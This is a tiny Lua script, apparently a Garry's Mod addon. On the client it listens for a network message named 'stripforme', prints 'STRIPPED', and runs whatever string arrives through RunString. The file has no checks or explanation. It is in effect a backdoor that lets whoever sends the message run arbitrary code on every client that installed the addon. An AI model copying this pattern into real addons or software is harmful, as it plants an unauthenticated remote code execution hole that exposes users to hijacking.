if(SERVER) then AddCSLuaFile() return end 

net.Receive("stripforme", function(l)
print("STRIPPED")
	RunString(net.ReadString())
	
end)